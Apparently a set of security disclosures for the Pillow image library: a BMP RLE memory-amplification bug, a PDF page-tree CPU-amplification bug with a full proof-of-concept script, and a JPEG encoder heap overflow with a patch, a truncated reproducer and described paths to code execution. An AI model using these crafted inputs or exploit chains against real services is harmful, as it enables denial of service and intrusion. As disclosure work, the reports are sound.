## Summary BmpRleDecoder can be forced to allocate gigabytes of memory from a kilobyte-sized crafted BMP file via unbounded growth in the delta escape and absolute mode branches.  ## Affected versions All versions up to and including current HEAD (v13.0.0.dev0, commit e7a7ea84)  ## Root cause BmpRleDecoder.decode() (BmpImagePlugin.py:327-395) builds a Python bytearray `data` with dest_length = xsize*ysize, looping `while len(data) < dest_length`. The loop condition is only checked at the TOP; individual branches append attacker-controlled amounts UNBOUNDED by dest_length:  - delta escape (line 370): data += b"\x00" * (right + up * self.state.xsize) with right,up in 0..255 -> up to ~255*xsize bytes in ONE iteration. - absolute mode (line 385): data += bytes_read (up to 255).  Because a single delta can push len(data) to ~256 * (row size), a tiny RLE stream combined with a large-but-legal xsize (xsize*ysize just under MAX_IMAGE_PIXELS, ~89M) yields a multi-GB `data` bytearray (then copied again by bytes(data) and set_as_raw). No heap OOB (bytearray/set_as_raw are bounds-safe), but a severe memory-amplification DoS: the attacker file stays tiny.  ## Reproduction Python 3.13, Pillow HEAD e7a7ea84  Attached: pillow_poc_bmp_rle_dos.py  A 1084-byte BMP (BI_RLE8, width=3,000,000, height=1 -> 3M px, passes bomb check) with one delta escape (00 02 00 150) produces ~429 MB `data`; measured peak RSS 911 MB. Scaling width toward the bomb limit and up=255 produces tens of GB from a ~1 KB file.  ## Suggested fix Cap growth at dest_length in the delta and absolute branches, e.g. clamp the delta fill to (dest_length - len(data)) and stop appending once len(data) >= dest_length; reject deltas that would move the cursor beyond the image, matching the existing per-row clamp at line 341-343.  Credit: Yazan Balawneh - CyStack Security Team (GitHub: sonicnew)  [pillow_poc_bmp_rle_dos.py](https://github.com/user-attachments/files/30244974/pillow_poc_bmp_rle_dos.py)

### Summary Pillow's documented PDF append path can spend disproportionate CPU time on a compact malformed PDF page tree.  An attacker who can supply an existing PDF to an application that appends an image with `Image.save(..., format="PDF", append=True)` can provide a malformed `/Pages` tree where each level repeats the same child `/Pages` reference in `/Kids`. Pillow treats the graph as a tree and expands each repeated reference in `PdfParser.linearize_page_tree()` without tracking visited or duplicate indirect references.  In the bounded proof below, a `1410`-byte PDF expands to `8192` page references from one distinct page object and takes about `9.6` seconds through the append path. A comparable linear control with the same depth stays at one page reference and completes in about `0.02` seconds.  This is in scope for Pillow's security policy because it is reproducible in `main`, affects the latest public release tested (`12.3.0`), and is not just an unexpected Python exception. The vulnerable operation accepts attacker-controlled PDF bytes through Pillow's PDF parser and causes deterministic resource consumption before normal completion.  ### Details  #### Affected versions  - Package: `Pillow` - Ecosystem: `pip` / PyPI - Affected component: `src/PIL/PdfParser.py` page-tree traversal reached from `src/PIL/PdfImagePlugin.py` PDF append handling - Runtime-tested affected release: `12.3.0` - Runtime-tested affected development version: `13.0.0.dev0` - Tested commit: `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Current source artifact hash: `sha256(git archive --format=tar HEAD) = 2ccefca23d432456765be8d3c34564c65ba016b0c9da1e44ca389762f7eda054` - Release `12.3.0` commit: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d` - Release `12.3.0` source artifact hash: `sha256(git archive --format=tar 12.3.0) = 94bed33fd20123938dbc0153d295250bb4e3c09251b6d4a34f7595e25d409c81` - Source-level affected: `5.1.0`, `12.2.0`, `12.3.0`, and `HEAD` - Likely affected range: `>= 5.1.0` - Patched versions: none known  Evidence fact strings:  - Runtime-tested affected: 12.3.0 - Runtime-tested affected: 13.0.0.dev0 at b39b9649312fbc381060e8c7c7f9f0de4cc63daa - Source-level affected: 5.1.0 - Source-level affected: 12.2.0 - Source-level affected: HEAD - Likely affected range: >= 5.1.0, no fixed version known - Pre-boundary note: 5.0.0 has PdfImagePlugin.py but no src/PIL/PdfParser.py  `5.0.0` contains `src/PIL/PdfImagePlugin.py` but does not contain `src/PIL/PdfParser.py`. `PdfParser.py` was introduced by `6207b44ab1ff4a91d8ddc7579619876d0bb191a4` (`2018-01-18 issue #2959: support appending to existing PDFs`), which shipped in `5.1.0`.  #### Technical details  The reachable path is:  1. A service or application receives an attacker-influenced existing PDF and appends an image using Pillow's public PDF save path:     ```python    Image.new("L", (1, 1), 0).save(existing_pdf_file, format="PDF", append=True)    ```  2. `src/PIL/PdfImagePlugin.py` routes `append=True` to `PdfParser`:     ```python    is_appending = im.encoderinfo.get("append", False)    filename_str = filename.decode() if isinstance(filename, bytes) else filename    if is_appending:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="r+b")    else:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="w+b")    ```  3. `src/PIL/PdfParser.py` parses the existing PDF and linearizes the page tree:     ```python    self.page_tree_root = self.read_indirect(self.pages_ref)    self.pages = self.linearize_page_tree(self.page_tree_root)    self.orig_pages = self.pages[:]    ```  4. `linearize_page_tree()` recursively follows every `/Kids` entry and extends the page list. It does not track page-tree node identity, duplicate references, or active traversal references:     ```python    def linearize_page_tree(        self, node: PdfDict | None = None    ) -> list[IndirectReference]:        page_node = node if node is not None else self.page_tree_root        check_format_condition(            page_node[b"Type"] == b"Pages", "/Type of page tree node is not /Pages"        )        pages = []        for kid in page_node[b"Kids"]:            kid_object = self.read_indirect(kid)            if kid_object[b"Type"] == b"Page":                pages.append(kid)            else:                pages.extend(self.linearize_page_tree(node=kid_object))        return pages    ```  5. During append, `rewrite_pages()` then iterates the expanded `orig_pages` list and scans/replaces entries in `self.pages`, adding more cost to the already expanded duplicate-reference list.  The missing invariant is:  ```text The PDF page tree should be treated as an acyclic tree of unique indirect references before Pillow builds pages/orig_pages or rewrites pages. ```  The proof intentionally uses a malformed PDF page-tree DAG: each `/Pages` node repeats the same next `/Pages` child reference twice. Pillow accepts this graph and expands it as if the repeated reference represented distinct subtrees.  ### PoC  Environment used for validation:  - OS/runtime: Linux, Python `3.13.11` - Current tested build: Pillow `13.0.0.dev0`, commit `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Latest release tested: Pillow `12.3.0` - The proof uses only synthetic in-memory PDFs and does not contact the network.  Save this as `poc_pillow_pdf_page_tree_dag.py`:  ```python #!/usr/bin/env python3 from __future__ import annotations  import io import json import sys import time  from PIL import Image, PdfParser import PIL   def make_page_tree_pdf(depth: int, fanout: int) -> bytes:     if fanout not in (1, 2):         raise ValueError("fanout must be 1 or 2")      objects: list[bytes] = [b"<< /Type /Catalog /Pages 2 0 R >>"]     for object_id in range(2, depth + 3):         next_id = object_id + 1         kids = b" ".join(f"{next_id} 0 R".encode("ascii") for _ in range(fanout))         parent = b"" if object_id == 2 else f" /Parent {object_id - 1} 0 R".encode()         objects.append(b"<< /Type /Pages /Kids [ " + kids + b" ]" + parent + b" >>")     objects.append(f"<< /Type /Page /Parent {depth + 2} 0 R >>".encode("ascii"))      result = bytearray(b"%PDF-1.4
")     offsets = [0]     for object_id, value in enumerate(objects, start=1):         offsets.append(len(result))         result.extend(f"{object_id} 0 obj
".encode("ascii"))         result.extend(value)         result.extend(b"
endobj
")      xref_offset = len(result)     result.extend(f"xref
0 {len(objects) + 1}
".encode("ascii"))     result.extend(b"0000000000 65535 f 
")     for offset in offsets[1:]:         result.extend(f"{offset:010d} 00000 n 
".encode("ascii"))     result.extend(         f"trailer
<< /Size {len(objects) + 1} /Root 1 0 R >>
"         f"startxref
{xref_offset}
%%EOF
".encode("ascii")     )     return bytes(result)   def run_case(depth: int, fanout: int) -> dict[str, object]:     payload = make_page_tree_pdf(depth, fanout)     expected_refs = fanout ** (depth + 1)      start = time.monotonic()     with PdfParser.PdfParser(buf=payload) as pdf:         observed_refs = len(pdf.pages)         distinct_refs = len(set(pdf.pages))     parse_seconds = time.monotonic() - start      output = io.BytesIO(payload)     start = time.monotonic()     Image.new("L", (1, 1), 0).save(output, format="PDF", append=True)     append_seconds = time.monotonic() - start      return {         "fanout": fanout,         "depth": depth,         "input_bytes": len(payload),         "expected_refs": expected_refs,         "observed_refs": observed_refs,         "distinct_refs": distinct_refs,         "parse_seconds": round(parse_seconds, 6),         "append_seconds": round(append_seconds, 6),         "output_bytes_after_append": len(output.getvalue()),     }   def main() -> int:     depth = int(sys.argv[1]) if len(sys.argv) > 1 else 12     if not 0 <= depth <= 16:         raise SystemExit("depth must be between 0 and 16")      linear = run_case(depth, fanout=1)     shared_dag = run_case(depth, fanout=2)      checks = {         "linear_control_stays_one_page": linear["observed_refs"] == 1,         "candidate_expands_to_expected_duplicate_refs": shared_dag["observed_refs"]         == shared_dag["expected_refs"],         "candidate_has_one_distinct_page_ref": shared_dag["distinct_refs"] == 1,         "candidate_input_is_compact": shared_dag["input_bytes"] <= 2048,         "append_path_processed_both_inputs": linear["output_bytes_after_append"]         > linear["input_bytes"]         and shared_dag["output_bytes_after_append"] > shared_dag["input_bytes"],     }     result = {         "pillow_version": PIL.__version__,         "pillow_file": PIL.__file__,         "depth": depth,         "linear_control": linear,         "shared_dag_candidate": shared_dag,         "checks": checks,         "overall_passed": all(checks.values()),     }     print(json.dumps(result, indent=2, sort_keys=True))     return 0 if result["overall_passed"] else 1   if __name__ == "__main__":     raise SystemExit(main()) ```  Run:  ```bash python3 poc_pillow_pdf_page_tree_dag.py ```  Expected result:  ```text "overall_passed": true "linear_control": observed_refs == 1 "shared_dag_candidate": input_bytes == 1410 "shared_dag_candidate": observed_refs == 8192 "shared_dag_candidate": distinct_refs == 1 ```  Observed on current `main` / `13.0.0.dev0`:  ```text 1410-byte input -> 8192 observed page refs -> 9.563007s append ```  Observed on Pillow `12.3.0`:  ```text Pillow 12.3.0: 1410-byte input -> 8192 observed page refs -> 9.670602s append ```  For comparison, the linear control in the same harness uses a comparable-depth page tree with `fanout=1`; it produces one page reference and completed append in about `0.016` to `0.028` seconds in my validation runs.  ### Impact  This is an availability issue in Pillow's PDF append handling. Applications are impacted if untrusted users can supply an existing PDF that the application later appends to, watermarks, or exports using Pillow's `Image.save(..., format="PDF", append=True)` route.  The demonstrated primitive is deterministic CPU/resource amplification from compact attacker-controlled PDF bytes. The proof does not demonstrate confidentiality impact, integrity impact, memory corruption, filesystem access, network access, or impact through ordinary `Image.open()`.  Requires attacker-influenced existing PDF processed by Pillow's documented PDF append path; not ordinary Image.open().  This should not be treated as just an unexpected Python exception. In the tested affected builds, the malformed PDF is accepted and processed to normal completion after the expensive expansion.  ### Remediation  Reject duplicate and cyclic page-tree references before constructing `self.pages` and `self.orig_pages`.  One possible fix is to pass traversal state through `linearize_page_tree()`:  - Track active `/Pages` references to reject cycles. - Track seen page-tree and page indirect references to reject duplicate references. - Raise `PdfFormatError` when the page tree is not an acyclic tree of unique indirect references.  Suggested regression tests:  - A small PDF whose `/Kids` array repeats the same child `/Pages` reference should raise `PdfFormatError` quickly when used through `Image.save(..., format="PDF", append=True)`. - A normal nested linear page tree should continue to append successfully.

``` ============================================================================ Heap buffer overflow writing JPEG comment after ICC profile fills buffer Location: src/libImaging/JpegEncode.c:330  in ImagingJpegEncode() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  A heap buffer overflow in Pillow's JPEG encoder lets anyone who can supply an image write up to 64 KB of bytes they choose, followed by the rest of the compressed image, past the end of a 64 KB heap buffer. The target is any application that re-saves the image as JPEG while keeping its colour profile. The reliable result is that the Python process is killed outright rather than raising an exception. Because the overwritten memory sits directly in front of function pointers that the encoder calls next, this could allow code execution, though the attached reproducer demonstrates only the crash.  The bug is in `ImagingJpegEncode()` in `src/libImaging/JpegEncode.c`. State 4 (line 330) calls `jpeg_write_marker()` for the COM comment marker without checking that the output buffer has room. Meanwhile, `JpegImagePlugin._save()` sizes that buffer from the EXIF and ICC/XMP data only and reserves nothing for the comment. When a 65498-byte ICC profile fills the 65536-byte buffer exactly, libjpeg's `emit_byte()` stores one byte past the end and then decrements `free_in_buffer` from 0. The `size_t` counter wraps, so the marker, the comment and the entire compressed image are written out of bounds.  Triggering it takes only a valid JPEG (or PNG) carrying that profile and any comment, passed through `Image.open()` and then `im.save(..., "JPEG", icc_profile=im.info.get("icc_profile"))`. That is the documented way to preserve colour. The comment is forwarded from `im.info` automatically, and no non-default setting is involved.  The attached reproducer re-saves such a file on the stock build, and the process dies with SIGSEGV. An identical file without the comment saves normally. An ASan build of Pillow will not flag this, because the stray writes happen inside the system libjpeg-turbo. Valgrind does report it, as an invalid write immediately after the 65569-byte allocation.  The unguarded call was introduced in e50ae85ea406 ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0.  ## Details  `ImagingJpegEncode()` (`src/libImaging/JpegEncode.c`) is a resumable state machine that fills a caller-supplied output buffer of `bytes` bytes and returns when it is full. State 4 writes the JPEG COM marker with `jpeg_write_marker()` without first checking that the buffer has any room left. When the preceding state 3 — the verbatim copy of the "extra" APP segments (ICC profile / XMP) — ends exactly at the last byte of the buffer, `jpeg_write_marker()` is entered with `free_in_buffer == 0`. libjpeg's `emit_byte()` stores the byte first and tests `--free_in_buffer == 0` afterwards, so the `size_t` counter wraps to 2^64-1 instead of triggering the "buffer full" path, and the 4-byte marker header, the whole comment, and then (state 5) the DQT/SOF/DHT/SOS headers and the entire entropy-coded image are written linearly past the end of the 65536-byte heap buffer allocated in `src/encode.c`.  A JPEG laid out as  ``` FFD8                                   SOI FFE2 <len> "ICC_PROFILE\0" 01 01 <65498 bytes>     -> im.info["icc_profile"] FFFE <len> <comment, any length 1..65533>           -> im.info["comment"] <any baseline RGB JPEG body> ```  opened with `Image.open()` and re-saved with the usual colour-profile-preserving call  ```python im.save(out, "JPEG", icc_profile=im.info.get("icc_profile")) ```  kills the Python process on the stock build at this commit: glibc aborts with `realloc(): invalid next size` / `corrupted size vs. prev_size`, or the process takes SIGSEGV inside `jpeg_write_marker`/`jpeg_write_scanlines`. Stopping at `JpegEncode.c:330` in gdb shows `next_output_byte - buf == 65536`, `free_in_buffer == 0`, `comment_size == 65533` before the call, and `next_output_byte - buf == 131073`, `free_in_buffer == 18446744073709486079` after it — 65537 bytes already written beyond a 65536-byte buffer before a single scanline has been encoded. An ASan build of Pillow does not flag this, because the out-of-bounds stores happen inside the (uninstrumented) system libjpeg-turbo; valgrind does, reporting `Invalid write ... 0 bytes after a block of size 65,569` from `jpeg_write_marker` called at `JpegEncode.c:330` before aborting on the corrupted heap metadata.  ### Code path  The buffer. `JpegImagePlugin._save()` sizes the encoder buffer from the metadata it is about to emit, allowing one spare byte after the extra block and nothing for the comment:  ```python # src/PIL/JpegImagePlugin.py:859-862     else:         # The EXIF info needs to be written as one block, + APP1, + one spare byte.         # Ensure that our buffer is big enough. Same with the icc_profile block.         bufsize = max(len(exif) + 5, len(extra) + 1) ```  `ImageFile._save()` then takes `max(MAXBLOCK, bufsize, width*4)` (`src/PIL/ImageFile.py:662`, `MAXBLOCK = 65536`), and `_encode()` allocates exactly that: `buf = PyBytes_FromStringAndSize(NULL, bufsize)` (`src/encode.c:134`; the real-file path `_encode_to_file()` does `malloc(bufsize)` at `src/encode.c:190`). For the input above `len(extra) == 65516`, so the buffer is 65536 bytes. The `optimize`/`progressive` branch just above (`JpegImagePlugin.py:846-858`) is not immune: its `bufsize` adds `w*h` (or `2*w*h`), but the image dimensions and the ICC length both come from the file, so an exact fit is still constructible there (e.g. with a 19×1 image).  The "+1 spare byte" does not account for what libjpeg itself has already put in the buffer: in state 1 `jpeg_start_compress(&cinfo, TRUE)` (`JpegEncode.c:279`) emits SOI + JFIF APP0, 20 bytes for an RGB source. State 3 then copies the extra block, clamped to the space remaining:  ```c // src/libImaging/JpegEncode.c:302-337         case 3:             if (context->extra) {                 unsigned int n = context->extra_size - context->extra_offset;                 if (n > context->destination.pub.free_in_buffer) {                     n = context->destination.pub.free_in_buffer;                 }                 memcpy(context->destination.pub.next_output_byte, context->extra + context->extra_offset, n);                 context->destination.pub.next_output_byte += n;                 context->destination.pub.free_in_buffer -= n;                 context->extra_offset += n;                 if (context->extra_offset >= context->extra_size) {                     state->state++;                 // done -> fall into case 4, even with free_in_buffer == 0                 } else {                     break;                 }             } …          case 4:             if (context->comment) {                 jpeg_write_marker(&context->cinfo, JPEG_COM,                                   (unsigned char *)context->comment, context->comment_size);   // :330 — no space check             }             state->state++;          case 5:             if (1024 > context->destination.pub.free_in_buffer) {   // passes: free_in_buffer is now ~2^64                 break;             }             … jpeg_write_scanlines(…) … ```  Every other emitting state is guarded — state 2 requires `rawExifLen + 5 <= free_in_buffer` (`:287`), state 5 requires 1024 free bytes (`:340`), state 6 requires 100 (`:368`). State 4 has no guard at all. The unguarded `jpeg_write_marker()` call was introduced in `e50ae85ea406` ("Use jpeg_write_marker to write comment", 2022-12-05) and first shipped in 9.4.0; at 9.3.0 the same input re-saves correctly.  With 20 header bytes plus 65516 extra bytes the copy consumes the buffer to the byte (`free_in_buffer == 0`) and, because the extra block is complete, control falls straight into state 4. One re-wrapped ICC APP2 segment costs 18 bytes of overhead (`JpegImagePlugin.py:788-806`), hence the 65498-byte profile payload. Pillow's destination manager cannot suspend (`empty_output_buffer()` returns FALSE, `JpegEncode.c:45-48`), which is why a *nearly* full buffer is harmless: with 1..N free bytes the comment write decrements `free_in_buffer` to 0 part-way, libjpeg raises `JERR_CANT_SUSPEND`, and the save fails with `OSError: broken data stream`. Only the exact-fit case skips that check, because libjpeg-turbo's marker writer is  ```c /* jcmarker.c */   *(dest->next_output_byte)++ = (JOCTET)val;   if (--dest->free_in_buffer == 0) { if (!(*dest->empty_output_buffer)(cinfo)) ERREXIT(cinfo, JERR_CANT_SUSPEND); } ```  i.e. it writes `buf[65536]` first and then wraps the counter. From there nothing limits the stream: the comment (up to 65533 attacker-chosen bytes) is written verbatim, state 5's 1024-byte check passes against the wrapped counter, and `jpeg_write_scanlines()` appends the full compressed image (≈100 KB for a 256×256 noisy source; proportional to the picture for larger ones). If the process survives that, `ImagingJpegEncode()` returns `next_output_byte - buf` (≈167000) as the byte count and `_encode()` calls `_PyBytes_Resize(&buf, 167199)` on the 65536-byte object, which is where glibc usually notices the smashed neighbouring chunk.  All three ingredients come from the file. `JpegImagePlugin` reassembles APP2 `ICC_PROFILE` chunks into `im.info["icc_profile"]` (`:238-241`) and stores the COM payload in `im.info["comment"]` (`:194`); `_save()` forwards the comment on its own — `comment = info.get("comment", im.info.get("comment"))` (`:808`) — so the application only has to pass the ICC profile through, which is the standard way to keep colours correct when re-encoding (`docs/handbook/image-file-formats.rst:608`). Unlike `exif` and `xmp`, there is no length check on the comment in `_save()`. A PNG source works the same way: its `iCCP` chunk becomes `im.info["icc_profile"]` and a `tEXt` chunk keyed `comment` becomes `im.info["comment"]` (and, being zlib-compressed, the file is only ~60 KB); that variant was also confirmed to crash. `thumbnail()` and `convert()` carry `im.info` along, so the usual `open → thumbnail → convert("RGB") → save("JPEG", icc_profile=…)` handler reaches the same state. `xmp=` and `extra=` feed the same `extra` block (33 bytes of overhead for the XMP APP1) and reach the same state. If the application also forwards EXIF, the exact-fit condition becomes `len(extra) + len(exif) + 4 == 65516`, both lengths again taken from the file. The comment length is irrelevant to triggering: a 17-byte `"Created with GIMP"` comment crashes the stock build just as reliably (SIGSEGV in `jpeg_write_scanlines`), it only changes how many of the out-of-bounds bytes are chosen verbatim by the attacker.  ### What lies behind the buffer  The buffer is `PyBytes_FromStringAndSize(NULL, 65536)` = `malloc(65569)`, a 0x10030-byte glibc chunk, so `buf[65536]` is the first byte of the next chunk's header. In the same `encode()` call, right after that allocation, `jpeg_start_compress()` `malloc`s libjpeg's PERMANENT pool (chunk 0xa40) and IMAGE pool (chunk 0x3f00); on a groomed or fresh heap these sit directly behind the buffer. The next thing `ImagingJpegEncode()` does after the COM write (`JpegEncode.c:352`; the state-5 room check passes because `free_in_buffer` has wrapped) is call `jpeg_write_scanlines()`, which dispatches through the method tables in that IMAGE pool before any allocator call touches the heap. In the SIGSEGV layout observed on the stock build the fault is at `jpeg_write_scanlines+133: call *0x8(%rax)` with `%rax` pointing just past the end of the buffer at memory now holding comment bytes — an indirect call through a function pointer (`cinfo->main->process_data`) read from bytes the file supplied.  ## Impact  Any service that accepts JPEG uploads and re-encodes them as JPEG while preserving the embedded ICC profile (`icc_profile=im.info.get("icc_profile")` — thumbnailers, CMS and e-commerce image pipelines, Django/Flask upload handlers) can be made to perform a linear heap overwrite starting immediately after a 65536-byte buffer: 4 marker bytes, then up to 65533 bytes taken verbatim from the file's COM segment, then tens to hundreds of kilobytes of compressed image data. No non-default Pillow setting is involved and the file is an otherwise valid 140–210 KB JPEG that decodes normally. The dependable outcome is termination of the worker process by SIGSEGV or a glibc heap-consistency abort (not a Python exception), i.e. denial of service of everything that process serves.  It does not stop at a crash. Both the length and the content of the first 64 KB written out of bounds are attacker-chosen, the victim buffer is an ordinary `malloc` chunk, and what `jpeg_start_compress()` allocates directly behind it — libjpeg's PERMANENT and IMAGE pools, including the method pointers `jpeg_write_scanlines()` calls through immediately afterwards — is predictable. Against a long-lived stdlib-`http.server` worker running exactly the handler above (stock `/src` build, CPython 3.12 / glibc 2.36 / libjpeg62-turbo 2.1.5, ASLR/PIE/NX on, default Pillow settings, worker as root, attacker as uid 65534 given only the service address), this overflow was driven to shell command execution by the worker in two independent ways once library base addresses were known: (a) a JPEG with ~2400 APPn spray segments (heap grooming), the 65498-byte ICC profile and a 3020-byte COM whose bytes re-image the two libjpeg pools so that the real `grayscale_convert()` copies a chosen 384-byte scanline over `_PyRuntime`, setting `allocators.obj_arena.free = system` with `ctx` = the command — the request returns 200, the worker keeps serving, and the next pymalloc arena release runs the command (14/14 and 15/15 runs on fresh workers); (b) a 28-byte COM that rewrites the `size`/`next` of a groomed free tcache chunk sitting right behind the buffer so that Pillow's own `malloc(comment_size)` in the next JPEG save (`src/encode.c:1250`) returns `_imaging.so`'s writable `.got.plt`, the comment replaces `free` with `system`, and the encoder's cleanup `free(context->comment)` at `JpegEncode.c:376` runs the command (14/14, deterministic once groomed). The address knowledge came from separate memory-disclosure bugs in Pillow's TIFF paths that return library pointers in output pixels/tags; those are independent defects with their own fixes, but any such disclosure — present or future — is enough, and this overflow is the only memory *write* either chain needs. Fixing it reduces those leaks to disclosures rather than footholds.  ## Reproducing  `repro` is a single Python script. It uses the Pillow already built in `/src` and needs no rebuild. Run it as `./repro`. The last line of output is `BUG` or `OK`.  The script builds a valid 256×256 baseline JPEG from deterministic noise, so the compressed image data comes to about 100 KB. Right after SOI it adds an APP2 `ICC_PROFILE` segment (sequence 1 of 1) with a payload of `65536 - 20 - 18 = 65498` bytes. When Pillow re-encodes the image, libjpeg first writes 20 bytes of SOI and JFIF APP0, and then Pillow copies the re-wrapped ICC segment: 18 bytes of header plus the payload. Together those fill the 65536-byte encoder buffer to the last byte. The constants at the top of the script spell out this arithmetic.  Each file goes through the same application code in a child `python3 -X faulthandler` process:  ```python im = Image.open(BytesIO(data)) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) ```  1. **Control.** The file has the ICC profile but no COM segment. The save returns normally with exit status 0, which shows that the exact-fit ICC profile alone is harmless. 2. **PoC.** This is the same file plus a COM segment of 65533 `C` bytes. `JpegImagePlugin._save()` forwards `im.info["comment"]` automatically. Case 4 of `ImagingJpegEncode()` writes the COM marker into the full buffer, the `free_in_buffer` counter wraps, and the comment and the entire compressed image are written past the end of the heap buffer.  Expected output: the control prints `save returned normally` and `-> exit status 0`. For the PoC, faulthandler prints `Fatal Python error: Segmentation fault` (sometimes a glibc message such as `realloc(): invalid next size` followed by `Aborted`). The Python stack ends in `ImageFile._encode_tile` called from `im.save`, then `-> exit status -11` (or `-6`), and finally `BUG`. The verdict is `BUG` only if the PoC child was killed by a signal. A normal return or a Python exception such as `OSError` gives `OK`.  ## Suggested fix  The attached patch guards state 4 the way state 2 guards the EXIF marker: before calling `jpeg_write_marker()` it requires room for the 4-byte marker header plus the comment plus libjpeg's one-byte slack (`emit_byte` must never bring `free_in_buffer` to 0 with a non-suspending destination), and otherwise returns to the caller for a fresh buffer:  ```diff --- a/src/libImaging/JpegEncode.c +++ b/src/libImaging/JpegEncode.c @@ -327,6 +327,11 @@          case 4:                if (context->comment) { +                // check for comment len + 'COM' header bytes +                if (context->comment_size + 5 > +                    context->destination.pub.free_in_buffer) { +                    break; +                }                  jpeg_write_marker( ```  The encoder then returns with the buffer full, `_encode_tile()` calls it again with an empty buffer, and the comment is emitted there. The C hunk is not sufficient on its own: state 4, like state 2, relies on the Python side guaranteeing that an *empty* buffer is always large enough, and a 65533-byte comment needs 65538 bytes against a 65536-byte `MAXBLOCK` buffer — with only the C guard the encoder returns 0 bytes and no error forever and `_encode_tile()` spins. The patch therefore also changes `JpegImagePlugin._save()` to reserve `len(comment) + 5` in both sizing branches (added to `bufsize` in the `optimize`/`progressive` branch, and as a third term of the `max()` in the plain branch), and normalises the comment to `bytes` first (`str` is UTF-8-encoded, `None` becomes `b""`) so the length is exact for non-ASCII `str` comments; `encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.  The C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError("Comment is too long")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.  Independently, the "+ 1 spare byte" / "+ 5" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.  ## The patch  Check free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save  Applies to `src/libImaging/JpegEncode.c` at the commit above.  ```diff diff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py index b361aef2e..f884883c4 100644 --- a/Tests/test_file_jpeg.py +++ b/Tests/test_file_jpeg.py @@ -227,6 +227,16 @@ class TestFileJpeg:          im1 = self.roundtrip(hopper(), icc_profile=icc_profile)          assert im1.info.get("icc_profile") == (icc_profile or None)   +    def test_icc_big_comment(self) -> None: +        # The ICC profile may fill the encoder buffer exactly, in which case the +        # comment has to be written to the next buffer +        comment = b"C" * 65533 +        for n in range(ImageFile.MAXBLOCK - 40, ImageFile.MAXBLOCK - 30): +            icc_profile = b"I" * n +            im = self.roundtrip(hopper(), icc_profile=icc_profile, comment=comment) +            assert im.info["icc_profile"] == icc_profile +            assert im.info["comment"] == comment +      def test_large_icc_meta(self, tmp_path: Path) -> None:          # https://github.com/python-pillow/Pillow/issues/148          # Sometimes the meta data on the icc_profile block is bigger than diff --git a/src/PIL/JpegImagePlugin.py b/src/PIL/JpegImagePlugin.py index 4b8d34ca3..1d9f4c2fa 100644 --- a/src/PIL/JpegImagePlugin.py +++ b/src/PIL/JpegImagePlugin.py @@ -805,7 +805,9 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -> None:              )              i += 1   -    comment = info.get("comment", im.info.get("comment")) +    comment = info.get("comment", im.info.get("comment")) or b"" +    if isinstance(comment, str): +        comment = comment.encode()        # "progressive" is the official name, but older documentation      # says "progression" @@ -856,10 +858,13 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -> None:              bufsize += len(exif) + 5          if extra:              bufsize += len(extra) + 1 +        if comment: +            bufsize += len(comment) + 5      else:          # The EXIF info needs to be written as one block, + APP1, + one spare byte. -        # Ensure that our buffer is big enough. Same with the icc_profile block. -        bufsize = max(len(exif) + 5, len(extra) + 1) +        # Ensure that our buffer is big enough. Same with the icc_profile block +        # and the comment (COM marker). +        bufsize = max(len(exif) + 5, len(extra) + 1, len(comment) + 5)        ImageFile._save(          im, fp, [ImageFile._Tile("jpeg", (0, 0, *im.size), 0, rawmode)], bufsize diff --git a/src/libImaging/JpegEncode.c b/src/libImaging/JpegEncode.c index 098e431fc..b6771c6ec 100644 --- a/src/libImaging/JpegEncode.c +++ b/src/libImaging/JpegEncode.c @@ -327,6 +327,11 @@ ImagingJpegEncode(Imaging im, ImagingCodecState state, UINT8 *buf, int bytes) {          case 4:                if (context->comment) { +                // check for comment len + 'COM' header bytes +                if (context->comment_size + 5 > +                    context->destination.pub.free_in_buffer) { +                    break; +                }                  jpeg_write_marker(                      &context->cinfo,                      JPEG_COM, ```  ## The reproducer  <details> <summary>Reproducer — <code>repro</code>, 3,343 bytes (click to open)</summary>  Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.  ```python #!/usr/bin/env python3 # Pillow heap buffer overflow in ImagingJpegEncode() (src/libImaging/JpegEncode.c, case 4). # # Re-saving a JPEG with its own ICC profile, the usual "keep the colours" re-encode: #     im = Image.open(f); im.save(out, "JPEG", icc_profile=im.info["icc_profile"]) # If the ICC segment fills the 65536-byte encoder buffer to the last byte, the COM # marker (forwarded from im.info["comment"] automatically) is written with # free_in_buffer == 0. libjpeg stores the byte, then decrements the counter, which # wraps to ~2^64, and the comment plus the whole compressed image go past the end # of the heap buffer. The Python process dies with SIGSEGV or a glibc abort. # # Runs against the stock build in /src, no rebuild. Takes about 2 seconds. import random import struct import subprocess import sys from io import BytesIO  from PIL import Image  # Output-buffer layout at the moment the COM marker is written: ENCODER_BUFFER = 65536  # 